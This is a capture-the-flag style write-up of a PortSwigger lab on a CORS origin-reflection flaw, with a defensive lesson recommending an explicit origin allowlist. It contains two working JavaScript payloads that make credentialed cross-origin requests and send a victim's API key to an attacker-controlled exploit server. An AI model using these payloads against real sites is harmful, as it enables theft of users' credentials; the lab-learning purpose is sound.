# CORS vulnerability with basic origin reflection

**Category:** CORS
**Difficulty:** APPRENTICE
**Lab:** https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

Cross-origin resource sharing exists to relax the same-origin policy, not to enforce it — which
means every CORS configuration is a decision about how much of that protection a server is willing
to give up. The laziest version of that decision is answering "which origins can read my response?"
with "whatever origin just asked." This lab is the cleanest possible demonstration of what that
laziness costs: an API key that's supposed to belong to one logged-in user, readable from any
website on the internet.

## The Target

The lab is a small account-management app. Logging in and loading the account page triggers an
AJAX call:

```
GET /accountDetails
```

The response carries the logged-in user's API key. Nothing about the page itself looks unusual —
the key isn't exposed anywhere in the HTML, only inside this XHR response, and only after
authentication.

## The Investigation

The interesting question for any CORS-protected endpoint is what happens when the `Origin` header
doesn't match the app's own domain at all. We sent `/accountDetails` with an arbitrary attacker
origin and checked the response headers for `Access-Control-Allow-Origin` (ACAO) and
`Access-Control-Allow-Credentials` (ACAC).

The response reflected our origin back verbatim in ACAO and set `Access-Control-Allow-Credentials:
true`. That combination is the entire vulnerability: the server isn't checking the origin against
an allowlist at all — it's echoing back whatever `Origin` header arrived and telling the browser
it's fine to include credentials (the session cookie) on the request. A browser enforcing CORS
correctly will honor exactly that instruction: since the server says this origin is trusted and
credentials are allowed, a script running on a completely unrelated domain is now permitted to read
the authenticated response.

## The Exploit

We built a page that performs a credentialed `XMLHttpRequest` to `/accountDetails` and forwards the
response to a location we control:

```html
<script>
  var req = new XMLHttpRequest();
  req.onload = function() {
    location = 'https://EXPLOIT-SERVER/log?key=' + encodeURIComponent(this.responseText);
  };
  req.open('GET', 'https://TARGET/accountDetails', true);
  req.withCredentials = true;
  req.send();
</script>
```

`withCredentials = true` is what makes the browser attach the victim's session cookie to a
cross-origin request. Because the target server reflects our origin and allows credentials, the
browser lets `req.onload` fire with the real response body — the victim's API key — and the
`location` redirect ships it straight to our exploit server's log endpoint as a query string.

We stored this page on the PortSwigger exploit server and delivered it to the victim. A few
seconds later, the exploit server's access log contained a `GET /log?key=...` request with the
victim's API key URL-encoded in the query string, which we extracted with a regex against the
`apikey` field and submitted as the lab's solution.

## Comparing Notes: PortSwigger's Official Solution

PortSwigger's official solution reaches the same conclusion through the same mechanism: intercept
the `/accountDetails` request in Burp, resend it in Repeater with an added `Origin:
https://example.com` header, and observe that origin reflected back in ACAO. Their exploit script
is functionally identical to ours — a credentialed `XMLHttpRequest` to `/accountDetails` whose
response is forwarded via a `location` redirect:

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
  location='/log?key='+this.responseText;
};
</script>
```

The only real differences are cosmetic: they name the callback `reqListener` and route the redirect
through the exploit server's own relative `/log` path, while ours defines the callback inline and
URL-encodes the stolen value with `encodeURIComponent`. The underlying technique — origin
reflection plus `Access-Control-Allow-Credentials: true` plus a credentialed XHR — is exactly the
same. As usual, the process differs more than the payload: PortSwigger's walkthrough drives this
through Burp's Repeater and the exploit server's web UI by hand, while we confirmed the
misconfiguration and delivered the exploit through a scripted `httpx` client instead.

## What This Teaches Us

Reflecting the `Origin` header back as ACAO isn't a middle ground between "allow everyone" and
"allow nobody" — it behaves exactly like a wildcard, except it also satisfies the browser's rule
that wildcards can't carry credentials. Any developer who reflects the origin specifically to get
around that restriction has built something functionally worse than `Access-Control-Allow-Origin:
*`, because now credentialed requests work too. The fix isn't a smarter reflection function; it's a
hardcoded, explicit allowlist of the specific origins that should ever be allowed to make
credentialed cross-origin requests, with everything else rejected outright.
